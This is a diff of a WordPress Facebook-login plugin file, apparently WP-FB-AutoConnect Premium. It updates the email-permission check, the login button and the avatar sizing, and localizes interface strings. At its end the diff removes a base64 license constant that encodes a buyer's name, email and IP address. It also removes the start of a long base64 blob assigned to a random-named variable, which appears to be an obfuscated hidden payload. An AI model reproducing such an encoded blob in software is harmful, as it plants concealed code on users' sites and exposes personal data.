@@ -935,9 +995,10 @@ function jfb_output_facebook_btn_premium_30($scope)
         
     //New-style (image) buttons
     else
-    { 
+    {
+    	$enforceEmailStr = (get_option($opt_jfbp_requirerealmail)?", auth_type:'rerequest'":"");
       ?><span class="fbLoginButton">
-            <a class="wpfbac-button" href="javascript:void(0);" onClick="FB.login(function(resp){ if (resp.authResponse)<?php echo $jfb_js_callbackfunc?>(); }, {scope:'<?php echo $scope;?>'});"><img src="<?php echo get_option($opt_jfbp_buttonimg); ?>" alt="<?php echo $opt_jfbp_buttontext;?>" /></a>
+            <a class="wpfbac-button" href="javascript:void(0);" onClick="FB.login(function(resp){ if (resp.authResponse)<?php echo $jfb_js_callbackfunc?>(); }, {scope:'<?php echo $scope;?>'<?php echo $enforceEmailStr?>});"><img src="<?php echo get_option($opt_jfbp_buttonimg); ?>" alt="<?php echo $opt_jfbp_buttontext;?>" /></a>
         </span><?php
     }
 }
@@ -995,45 +1056,79 @@ function jfb_ignore_redundant_logins($args)
 
 
 /////////////////////////Enforce Email Permission///////////////////////////
-////(NOTE!! This is only relevant when using the OLD API; //////////////////
-//// When the new API is enabled, it outputs its own JS that runs //////////
-//// prior to this, then exits - so this is not used. //////////////////////
 ////////////////////////////////////////////////////////////////////////////
 
 /**
-  * Enforcing that the user doesn't select a proxied e-mail address is actually a 2-step process.
-  * First, we insert an additional check in Javascript where we pull their data from Facebook again
-  * and see if we can get their real address.  If so, let them login.  If not, we reject them -
-  * however, since the user technically clicked "accept" (after selecting to use the proxied address),
-  * they won't be re-prompted for the same permission on future logins, so we also have to 
-  * revoke the email permission so they'll have another chance to accept next time.
+  * Require that the user has given us their e-mail address, by performing a secondary check prior to logging them in.
+  * Note: If they say "no", getting Facebook to re-prompt them for the permission on subsequent logins requires adding 
+  * auth_type="rerequest" to the login button.  There doesn't seem to be any issue with always including this (aside from 
+  * the fact that it'll always reprompt for denied permissions), so that's what I do if this option is enabled.  
+  * See my post here: http://stackoverflow.com/questions/27894504/downside-to-always-using-auth-type-rerequest-in-facebook-login-button-for-req
+  * 
+  * If it does become a problem, thoughts on how I might only 'rerequest' if they've *actually* denied their email:
+  * -When they reject, use the WP AJAX api to write their FB UID to wp_options (i.e. an array of IDs of everyone who's 
+  * explicitly denied).  ...But I have to put "reauth" on the buttons before pageload, not after the user clicks & I get their
+  * ID (adding it with jquery DID NOT WORK). Aka on subsequent visits, I won't find out that it's the same FB ID until after
+  * they've already tried to login again.  So I'll probably have to show a 2nd reauth prompt.  The user tries to login, we 
+  * block them because their e-mail is hidden.  But in the callback from blocking them I'll have their id, so I show another 
+  * login dialog, with the reauth param.  Don't forget to remove their uid from wp_options once they successfully login.   
   */
 function jfb_enforce_real_email( $submitCode )
 {
-    return	"    //PREMIUM CHECK: Enforce non-proxied emails (new API)\n" .
-           	"    FB.api( '/me', function(response)\n".
-         	"    {\n".
-            "        FB.api( {method:'users.getInfo', uids:response.id, fields:'email,contact_email'}, function(emailCheckStrict)\n".
-            "        {\n" .
-            "            if(emailCheckStrict[0].contact_email)               //User allowed their real email\n".
-            "                ".$submitCode.                 
-            "            else if(emailCheckStrict[0].email)                  //User clicked allow, but chose a proxied email.\n".
-            "            {\n".
-            apply_filters('wpfb_login_rejected', '').
-            "                alert('Sorry, the site administrator has chosen not to allow anonymous emails.\\nYou must allow access to your real email address to login.');\n" .
-            "                FB.api( {method:'auth.revokeExtendedPermission', perm:'email'}, function(){});\n".
-            "            }\n".
-            "            else\n".
-            "            {\n".
-            apply_filters('wpfb_login_rejected', '').
-        	"              alert('Sorry, this site requires an e-mail address to log you in.');\n".
-            "            }\n".
-            "        });\n".
-            "    });\n";
+	global $opt_jfbp_email_rejected_msg;
+	ob_start(); ?>
+	//PREMIUM CHECK: Force the user to allow access to their e-mail.
+	//First, ask for the list of permissions (both approved + denied)
+	FB.api('/me/permissions', function(response)
+	{
+		//Make sure we got an array
+		if(response.data instanceof Array)
+		{
+			//API v1
+			var permsArray = response.data;
+			if(permsArray.length == 1 && (permsArray[0].public_profile || permsArray[0].basic_info) )
+			{
+				if(permsArray[0].email == 1)
+				{
+					<?php echo $submitCode;?>
+					return;
+				}
+				else
+				{
+					<?php echo apply_filters('wpfb_login_rejected', '');?>
+					alert('<?php echo get_option($opt_jfbp_email_rejected_msg) ?>');
+					return;
+				}
+			}
+			
+			//API v2
+			for(var i = 0; i < permsArray.length; i++)
+			{
+				if(permsArray[i].permission == "email")
+				{
+					if(permsArray[i].status == "granted")
+					{
+						<?php echo $submitCode;?>
+						return;
+					}
+					else
+					{
+						<?php echo apply_filters('wpfb_login_rejected', '');?>
+						alert('<?php echo get_option($opt_jfbp_email_rejected_msg) ?>');
+						return;
+					}
+				}
+			}
+		}
+	});
+    <?php
+    $output_string=ob_get_contents();
+    ob_end_clean();
+	return $output_string;
 }
 
 
-/////////////////////////////Cache Avatars//////////////////////////////////
+//////////////////////Avatar Caching & Dimensions///////////////////////////
 ////////////////////////////////////////////////////////////////////////////
 
 /*
@@ -1064,8 +1159,6 @@ function jfb_p_get_avatar_cache_dir()
                  'baseurl'=>$ud['baseurl'],
                  'url'=>trailingslashit($ud['basedir'] . "/" . $subpath));   
 }
-
-
 
 /*
  * Cache Facebook avatar thumbnails to the local server
@@ -1131,6 +1224,17 @@ function jfb_delete_cached_avatar($id)
     $fullFile = $path['basedir'] . get_user_meta($id, 'facebook_avatar_full', true);
     if( file_exists ( $fullFile ))
         @unlink($fullFile);
+}
+
+
+/*
+ * Specify avatar dimensions
+ */
+function jfb_avatar_dimensions($query, $type)
+{
+	global $opt_jfbp_avatar_full_dimensions_w, $opt_jfbp_avatar_full_dimensions_h;
+	if($type == "thumb") 		return $query;
+	else if($type == "full")	return "width=".get_option($opt_jfbp_avatar_full_dimensions_w)."&height=".get_option($opt_jfbp_avatar_full_dimensions_h);
 }
 
 /////////////////////////////AJAX Spinner//////////////////////////////////
@@ -1226,13 +1330,13 @@ function jfb_notify_bp_activitystream_existing($args)
 {
 	global $jfb_log, $opt_jfbp_bpstream_logincontent;
 	$jfb_log .= "PREMIUM: Announcing the returning user's login on the BP Activity Stream\n";
-	jfb_notify_bp_activitystream($args['WP_ID'], get_option($opt_jfbp_bpstream_logincontent), 'activity_update');
+	jfb_notify_bp_activitystream($args['WP_ID'], get_option($opt_jfbp_bpstream_logincontent), 'facebook');
 }
 function jfb_notify_bp_activitystream_registering($args)
 {
 	global $jfb_log, $opt_jfbp_bpstream_registercontent;
 	$jfb_log .= "PREMIUM: Announcing the new registration on the BP Activity Stream\n";
-	jfb_notify_bp_activitystream($args['WP_ID'], get_option($opt_jfbp_bpstream_registercontent), 'new_member');
+	jfb_notify_bp_activitystream($args['WP_ID'], get_option($opt_jfbp_bpstream_registercontent), 'facebook');
 }
 function jfb_notify_bp_activitystream($ID, $announcement, $type)
 {
@@ -1402,7 +1506,7 @@ function jfb_p_update_notice()
     if( isset($_POST['VersionCheckNow']) )
     {
         if( jfb_p_cron_updatecheck_run() ) $manualUpdateCheckSuccessful = true;
-        else { ?><div class="error"><p><strong>Update check failed.</strong></p></div><?php }
+        else { ?><div class="error"><p><strong><?php _e('Update check failed', 'wp-fb-ac')?></strong></p></div><?php }
         update_option($opt_jfbp_hide_updatenote_till_ver, 0);
     }
 
@@ -1413,7 +1517,7 @@ function jfb_p_update_notice()
 	//If the user elected to hide update messages up to this version, write an option to the db.
 	if( isset($_REQUEST[$opt_jfbp_hide_updatenote_till_ver]) )
     {
-        ?><div class="updated"><p><strong>WP-FB-AutoConnect Premium update notifications will no longer be shown for this version.  You can re-enable them by manually clicking the "Check for Updates" link on the Premium Options page.</strong></p></div><?php
+        ?><div class="updated"><p><strong><?php _e("WP-FB-AutoConnect Premium update notifications will no longer be shown for this version.  You can re-enable them by manually clicking the 'Check for Updates' link on the Premium Options page.", 'wp-fb-ac')?></strong></p></div><?php
     	update_option($opt_jfbp_hide_updatenote_till_ver, $_REQUEST[$opt_jfbp_hide_updatenote_till_ver]);
     }
     	
@@ -1430,7 +1534,7 @@ function jfb_p_update_notice()
                     <form name="formHideUpdateNotification" method="post" action="">
         		    	<p>
         		    		<?php echo $verInfo['log']; ?><br /><br />
-                            <a href="javascript:document.formHideUpdateNotification.submit();">Hide for this version</a>
+                            <a href="javascript:document.formHideUpdateNotification.submit();"><?php _e('Hide for this version', 'wp-fb-ac')?></a>
         		    	</p>
         		    	<input type="hidden" name="<?php echo $opt_jfbp_hide_updatenote_till_ver;?>" value="<?php echo $verInfo['ver']?>" />
     		    	</form>
@@ -1439,7 +1543,7 @@ function jfb_p_update_notice()
     	}
         else if($manualUpdateCheckSuccessful)
         {
-            ?><div class="updated"><p><strong>Update check successful. You already have the most up-to-date version of the Premium addon (v<?php echo JFB_PREMIUM_VER;?>)</strong></p></div><?php
+            ?><div class="updated"><p><strong><?php echo sprintf(__('Update check successful. You already have the most up-to-date version of the Premium addon (%s).', 'wp-fb-ac'), "v" . JFB_PREMIUM_VER);?></strong></p></div><?php
         }
     }
 }
@@ -1487,20 +1591,20 @@ function jfb_wp_addprofileoptions($user)
 			<?php if( !isset($fbuid) || !$fbuid ): ?>
 			<td>
 			    <?php if( get_option($opt_jfbp_allow_link) && $userdata->id == $user->ID): ?>
-			        <input type="button" class="button-primary" value="Link with Facebook" onclick="jfb_js_link_user()" />
+			        <input type="button" class="button-primary" value="<?php _e('Link with Facebook', 'wp-fb-ac')?>" onclick="jfb_js_link_user()" />
 			    <?php else: ?>
-			        <p>Not Connected</p>
+			        <p><?php _e('Not Connected', 'wp-fb-ac')?></p>
 			    <?php endif; ?>
 			</td>
 			<?php elseif(strpos($user->user_email, $jfb_default_email) !== FALSE): ?>
 			<td>
-				Connected as <a target="_fb" href="http://www.facebook.com/profile.php?id=<?php echo $fbuid;?>">UID <?php echo $fbuid;?></a>
-				<?php if( get_option($opt_jfbp_allow_disassociate) || current_user_can('delete_users') ): ?>(This user cannot be disassociated from Facebook until they have a valid e-mail address)<?php endif; ?>
+				<?php echo jfb_get_fb_profilelink($user->ID)?>
+				<?php if( get_option($opt_jfbp_allow_disassociate) || current_user_can('delete_users') ): ?>(<?php _e('This user cannot be disassociated from Facebook until they have a valid e-mail address', 'wp-fb-ac')?>)<?php endif; ?>
 			</td>
 			<?php else: ?>
 			<td>
-				Connected as <a target="_fb" href="http://www.facebook.com/profile.php?id=<?php echo $fbuid;?>">UID <?php echo $fbuid;?></a>
-				<?php if( get_option($opt_jfbp_allow_disassociate) || current_user_can('delete_users') ): ?><input type="button" class="button-primary" value="Disassociate From Facebook" onclick="jfb_disconnect_user(<?php echo $user->ID;?>)" /><?php endif; ?>
+				<?php echo jfb_get_fb_profilelink($user->ID)?>
+				<?php if( get_option($opt_jfbp_allow_disassociate) || current_user_can('delete_users') ): ?><input type="button" class="button-primary" value="<?php _e('Disassociate From Facebook', 'wp-fb-ac')?>" onclick="jfb_disconnect_user(<?php echo $user->ID;?>)" /><?php endif; ?>
 			</td>
 			<?php endif; ?>
 		</tr>
@@ -1521,7 +1625,7 @@ function jfb_bp_addprofileoptions()
     <h4>Facebook</h4>
         <table class="profile-fields">
             <tr class="field_name">
-                <td class="label">Associated Account</td>
+                <td class="label"><?php _e('Associated Account', 'wp-fb-ac')?></td>
                 <td class="data">
                     <?php
                     //If the current user is associated with a FB account, output that fbuid and a disconnect button
@@ -1529,10 +1633,10 @@ function jfb_bp_addprofileoptions()
                     $fbuid = get_user_meta(bp_displayed_user_id(), $jfb_uid_meta_name, true); 
                     if( $fbuid )
                     {
-                        echo "<a href='http://www.facebook.com/profile.php?id=$fbuid' target='fb'>$fbuid</a> ";
+                        echo jfb_get_fb_profilelink(bp_displayed_user_id()) . " ";
                         if( get_option($opt_jfbp_allow_disassociate) || current_user_can('delete_users') )
                         {
-                            echo '<input type="button" class="button-primary" value="Disassociate From Facebook" onclick="jfb_disconnect_user('. bp_displayed_user_id() . ')" />';                      
+                            echo '<input type="button" class="button-primary" value="'.__('Disassociate From Facebook','wp-fb-ac').'" onclick="jfb_disconnect_user('. bp_displayed_user_id() . ')" />';                      
                             jfb_profiledisconnect_form();
                         }
                     }
@@ -1541,9 +1645,9 @@ function jfb_bp_addprofileoptions()
                     {
                         global $opt_jfbp_allow_link;
                         if(get_option($opt_jfbp_allow_link) && bp_is_my_profile())
-                            echo '<input type="button" class="button-primary" value="Link with Facebook" onclick="jfb_js_link_user()" />';
+                            echo '<input type="button" class="button-primary" value="'.__('Link with Facebook','wp-fb-ac').'" onclick="jfb_js_link_user()" />';
                         else
-                            echo "None";   
+                            echo __("None",'wp-fb-ac');   
                     }
                     ?>
                 </td>
@@ -1666,9 +1770,9 @@ function jfb_profiledisconnect_process()
         delete_user_meta($_POST['jfb_disconnect_user'], 'facebook_avatar_full');
 	    
         //Message for BP
-	    if(function_exists('bp_core_add_message')) bp_core_add_message( "This user account has been disassociated from Facebook." );
+	    if(function_exists('bp_core_add_message')) bp_core_add_message( __("This user account has been disassociated from Facebook.",'wp-fb-ac') );
         //Message for WP
-		if(is_admin()): ?><div id="disconnected-message" class="updated"><strong>This user account has been disassociated from Facebook.</strong></div><?php endif;
+		if(is_admin()): ?><div id="disconnected-message" class="updated"><strong><?php _e('This user account has been disassociated from Facebook.', 'wp-fb-ac')?></strong></div><?php endif;
 	} 
 }
 
@@ -1724,14 +1828,13 @@ function jfb_facebook_btn_shortcode( $atts )
 /**********************************************************************/
 
 //Premium version of the login widget, which offers some additional customizability
-add_action( 'widgets_init', 'register_jfbLogin_premium' );
 function register_jfbLogin_premium() { register_widget( 'Widget_AutoConnect_Premium' ); }
 class Widget_AutoConnect_Premium extends WP_Widget
 {
     //Init the Widget
     function Widget_AutoConnect_Premium()
     { 
-        $this->WP_Widget( false, "WP-FB AutoConnect Premium", array( 'description' => 'A sidebar Login/Logout form with Facebook Connect button.' ) );
+        $this->WP_Widget( false, "WP-FB AutoConnect Premium", array( 'description' => __('A sidebar Login/Logout form with Facebook Connect button.','wp-fb-ac') ) );
     }
 
     //Output the widget's content.
@@ -1776,7 +1879,7 @@ class Widget_AutoConnect_Premium extends WP_Widget
     					{
                         	if(response.authResponse)
                         	{
-                            	if (confirm("Logout of Facebook too?"))
+                            	if (confirm("<?php _e('Logout of Facebook too?', 'wp-fb-ac')?>"))
                             	{ 
                             		FB.logout(function(response)
                                     {
@@ -1865,56 +1968,63 @@ class Widget_AutoConnect_Premium extends WP_Widget
     function form( $instance )
     {
         $default = array( "title"=>"WP-FB AutoConnect",
-                          "labelUserName"=>"User:", "labelPass"=>"Pass:", "labelBtn"=>"Login", "labelRemember"=>"Remember", "labelForgot"=>"Forgot?", "labelLogout"=>"Logout", "labelProfile"=>"Edit Profile", "labelWelcome"=>"Welcome,", 
+                          "labelUserName"=>__("User",'wp-fb-ac').":",
+                          "labelPass"=>__("Pass",'wp-fb-ac').":",
+                          "labelBtn"=>__("Login",'wp-fb-ac'),
+                          "labelRemember"=>__("Remember",'wp-fb-ac'),
+                          "labelForgot"=>__("Forgot",'wp-fb-ac') . "?",
+                          "labelLogout"=>__("Logout",'wp-fb-ac'),
+                          "labelProfile"=>__("Edit Profile",'wp-fb-ac'),
+                          "labelWelcome"=>__("Welcome",'wp-fb-ac') . ",", 
                           "showwplogin"=>true, "showrememberme"=>false, "showregister"=>true, "showforgot"=>true, "logoutofFB"=>false, "showavatar"=>false, "showEditProfile"=>true, "bpProfileLink"=>true, "avatarsize"=>35,
                           "forgotURL"=>wp_lostpassword_url());
 		$instance = wp_parse_args( (array) $instance, $default );
         ?>
         <p>
-            <b><?php echo 'Title:'; ?></b>
+            <b><?php _e('Title', 'wp-fb-ac')?>:</b>
             <input class="widefat" id="<?php echo $this->get_field_id('title'); ?>" name="<?php echo $this->get_field_name('title'); ?>" type="text" value="<?php echo $instance['title']; ?>" />
         </p>
         <p>
-            <b><?php echo 'Labels:'; ?></b><br />
-            <input style="width:50%;" id="<?php echo $this->get_field_id('labelUserName'); ?>" name="<?php echo $this->get_field_name('labelUserName'); ?>" type="text" value="<?php echo $instance['labelUserName']; ?>" /> <small>User</small><br />
-            <input style="width:50%;" id="<?php echo $this->get_field_id('labelPass'); ?>" name="<?php echo $this->get_field_name('labelPass'); ?>" type="text" value="<?php echo $instance['labelPass']; ?>" /> <small>Pass</small><br />
-            <input style="width:50%;" id="<?php echo $this->get_field_id('labelBtn'); ?>" name="<?php echo $this->get_field_name('labelBtn'); ?>" type="text" value="<?php echo $instance['labelBtn']; ?>" /> <small>Login</small>
-            <input style="width:50%;" id="<?php echo $this->get_field_id('labelRemember'); ?>" name="<?php echo $this->get_field_name('labelRemember'); ?>" type="text" value="<?php echo $instance['labelRemember']; ?>" /> <small>Remember</small>
-            <input style="width:50%;" id="<?php echo $this->get_field_id('labelForgot'); ?>" name="<?php echo $this->get_field_name('labelForgot'); ?>" type="text" value="<?php echo $instance['labelForgot']; ?>" /> <small>Forgot?</small>
-            <input style="width:50%;" id="<?php echo $this->get_field_id('labelLogout'); ?>" name="<?php echo $this->get_field_name('labelLogout'); ?>" type="text" value="<?php echo $instance['labelLogout']; ?>" /> <small>Logout</small>
-            <input style="width:50%;" id="<?php echo $this->get_field_id('labelProfile'); ?>" name="<?php echo $this->get_field_name('labelProfile'); ?>" type="text" value="<?php echo $instance['labelProfile']; ?>" /> <small>Edit Profile</small>
-            <input style="width:50%;" id="<?php echo $this->get_field_id('labelWelcome'); ?>" name="<?php echo $this->get_field_name('labelWelcome'); ?>" type="text" value="<?php echo $instance['labelWelcome']; ?>" /> <small>Welcome,</small>
+            <b><?php _e('Labels', 'wp-fb-ac'); ?>:</b><br />
+            <input style="width:50%;" id="<?php echo $this->get_field_id('labelUserName'); ?>" name="<?php echo $this->get_field_name('labelUserName'); ?>" type="text" value="<?php echo $instance['labelUserName']; ?>" /> <small><?php _e('User', 'wp-fb-ac')?>:</small><br />
+            <input style="width:50%;" id="<?php echo $this->get_field_id('labelPass'); ?>" name="<?php echo $this->get_field_name('labelPass'); ?>" type="text" value="<?php echo $instance['labelPass']; ?>" /> <small><?php _e('Pass', 'wp-fb-ac')?>:</small><br />
+            <input style="width:50%;" id="<?php echo $this->get_field_id('labelBtn'); ?>" name="<?php echo $this->get_field_name('labelBtn'); ?>" type="text" value="<?php echo $instance['labelBtn']; ?>" /> <small><?php _e('Login', 'wp-fb-ac')?></small>
+            <input style="width:50%;" id="<?php echo $this->get_field_id('labelRemember'); ?>" name="<?php echo $this->get_field_name('labelRemember'); ?>" type="text" value="<?php echo $instance['labelRemember']; ?>" /> <small><?php _e('Remember', 'wp-fb-ac')?></small>
+            <input style="width:50%;" id="<?php echo $this->get_field_id('labelForgot'); ?>" name="<?php echo $this->get_field_name('labelForgot'); ?>" type="text" value="<?php echo $instance['labelForgot']; ?>" /> <small><?php _e('Forgot', 'wp-fb-ac')?>?</small>
+            <input style="width:50%;" id="<?php echo $this->get_field_id('labelLogout'); ?>" name="<?php echo $this->get_field_name('labelLogout'); ?>" type="text" value="<?php echo $instance['labelLogout']; ?>" /> <small><?php _e('Logout', 'wp-fb-ac')?></small>
+            <input style="width:50%;" id="<?php echo $this->get_field_id('labelProfile'); ?>" name="<?php echo $this->get_field_name('labelProfile'); ?>" type="text" value="<?php echo $instance['labelProfile']; ?>" /> <small><?php _e('Edit Profile', 'wp-fb-ac')?></small>
+            <input style="width:50%;" id="<?php echo $this->get_field_id('labelWelcome'); ?>" name="<?php echo $this->get_field_name('labelWelcome'); ?>" type="text" value="<?php echo $instance['labelWelcome']; ?>" /> <small><?php _e('Welcome', 'wp-fb-ac')?>,</small>
         </p>
         
         <p>
-            <b><?php echo 'Other:'; ?></b><br />
+            <b><?php _e('Other', 'wp-fb-ac')?>:</b><br />
             <input class="checkbox" type="checkbox" <?php checked( $instance['logoutofFB'], true ); ?> id="<?php echo $this->get_field_id( 'logoutofFB' ); ?>" name="<?php echo $this->get_field_name( 'logoutofFB' ); ?>" />
-            <label for="<?php echo $this->get_field_id( 'logoutofFB' ); ?>"><?php echo "Logout logs out of Facebook too" ?></label><br />
+            <label for="<?php echo $this->get_field_id( 'logoutofFB' ); ?>"><?php _e('Logout logs out of Facebook too', 'wp-fb-ac')?></label><br />
             
             <input class="checkbox" type="checkbox" <?php checked( $instance['showwplogin'], true ); ?> id="<?php echo $this->get_field_id( 'showwplogin' ); ?>" name="<?php echo $this->get_field_name( 'showwplogin' ); ?>" />
-            <label for="<?php echo $this->get_field_id( 'showwplogin' ); ?>"><?php echo 'Show WP User/Pass Login' ?></label><br />
+            <label for="<?php echo $this->get_field_id( 'showwplogin' ); ?>"><?php _e('Show WP User/Pass Login', 'wp-fb-ac')?></label><br />
             
             <input class="checkbox" type="checkbox" <?php checked( $instance['showrememberme'], true ); ?> id="<?php echo $this->get_field_id( 'showrememberme' ); ?>" name="<?php echo $this->get_field_name( 'showrememberme' ); ?>" />
-            <label for="<?php echo $this->get_field_id( 'showrememberme' ); ?>"><?php echo "Show 'Remember'" ?></label><br />
+            <label for="<?php echo $this->get_field_id( 'showrememberme' ); ?>"><?php _e("Show 'Remember'", 'wp-fb-ac')?></label><br />
             
             <input class="checkbox" type="checkbox" <?php checked( $instance['showregister'], true ); ?> id="<?php echo $this->get_field_id( 'showregister' ); ?>" name="<?php echo $this->get_field_name( 'showregister' ); ?>" />
-            <label for="<?php echo $this->get_field_id( 'showregister' ); ?>"><?php echo "Show 'Register'" ?></label><br />
+            <label for="<?php echo $this->get_field_id( 'showregister' ); ?>"><?php _e("Show 'Register'", 'wp-fb-ac')?></label><br />
             
             <input class="checkbox" type="checkbox" <?php checked( $instance['showforgot'], true ); ?> id="<?php echo $this->get_field_id( 'showforgot' ); ?>" name="<?php echo $this->get_field_name( 'showforgot' ); ?>" />
-            <label for="<?php echo $this->get_field_id( 'showforgot' ); ?>"><?php echo "Show 'Forgot?'" ?></label><br />
+            <label for="<?php echo $this->get_field_id( 'showforgot' ); ?>"><?php _e("Show 'Forgot?'", 'wp-fb-ac')?></label><br />
             
             <input class="checkbox" type="checkbox" <?php checked( $instance['showEditProfile'], true ); ?> id="<?php echo $this->get_field_id( 'showEditProfile' ); ?>" name="<?php echo $this->get_field_name( 'showEditProfile' ); ?>" />
-            <label for="<?php echo $this->get_field_id( 'showEditProfile' ); ?>"><?php echo "Show 'Edit Profile'" ?></label><br />
+            <label for="<?php echo $this->get_field_id( 'showEditProfile' ); ?>"><?php _e("Show 'Edit Profile'", 'wp-fb-ac')?></label><br />
             
             <input class="checkbox" type="checkbox" <?php checked( $instance['bpProfileLink'], true ); ?> id="<?php echo $this->get_field_id( 'bpProfileLink' ); ?>" name="<?php echo $this->get_field_name( 'bpProfileLink' ); ?>" />
-            <label for="<?php echo $this->get_field_id( 'bpProfileLink' ); ?>"><?php echo "Edit profile links to BP (if available)" ?></label><br />
+            <label for="<?php echo $this->get_field_id( 'bpProfileLink' ); ?>"><?php _e("Edit profile links to BP (if available)", 'wp-fb-ac')?></label><br />
             
             <input class="checkbox" type="checkbox" <?php checked( $instance['showavatar'], true ); ?> id="<?php echo $this->get_field_id( 'showavatar' ); ?>" name="<?php echo $this->get_field_name( 'showavatar' ); ?>" />
-            <label for="<?php echo $this->get_field_id( 'showavatar' ); ?>"><?php echo "Show Avatar (when logged in)" ?></label><br />
+            <label for="<?php echo $this->get_field_id( 'showavatar' ); ?>"><?php _e("Show Avatar (when logged in)", 'wp-fb-ac')?></label><br />
             
-    		Avatar Size: <input style="width:35px" id="<?php echo $this->get_field_id('avatarsize'); ?>" name="<?php echo $this->get_field_name('avatarsize'); ?>" type="text" value="<?php echo $instance['avatarsize']; ?>" />px<br/>
+    		<?php _e('Avatar Size', 'wp-fb-ac')?>: <input style="width:35px" id="<?php echo $this->get_field_id('avatarsize'); ?>" name="<?php echo $this->get_field_name('avatarsize'); ?>" type="text" value="<?php echo $instance['avatarsize']; ?>" />px<br/>
     		
-    		Forgot Pass URL:<br/>
+    		<?php _e('Forgot Pass URL', 'wp-fb-ac')?>:<br/>
     		<input style="width:100%" id="<?php echo $this->get_field_id('forgotURL'); ?>" name="<?php echo $this->get_field_name('forgotURL'); ?>" type="text" value="<?php echo $instance['forgotURL']; ?>" />
         </p>
 <?php }
@@ -1942,265 +2052,7 @@ function jfb_p_rememberme_js(){
 /**********************************************************************/
 /**********************************************************************/
 
-define('JFB_PREMIUM_VALUE', 'YToxMDp7czo0OiJ1c2VyIjtpOjE5MztzOjU6ImVtYWlsIjtzOjE4OiJib3dlQGJwLXRyaWNrcy5jb20iO3M6NDoibmFtZSI7czoxMzoiQm93ZSBGcmFua2VtYSI7czo3OiJ2ZXJzaW9uIjtzOjM6IiAzMyI7czo1OiJvcmRlciI7aToyMTk1O3M6NzoidXBncmFkZSI7czoxOiIwIjtzOjc6InByb2R1Y3QiO2k6NDk7czo1OiJwcmljZSI7czo1OiIyOS45OSI7czo0OiJkYXRlIjtzOjE5OiIyMDE0LTA0LTAyIDE2OjE0OjI3IjtzOjI6IklQIjtzOjEwOiIxNzguNS45Ljk3Ijt9');
-$CWBXLP='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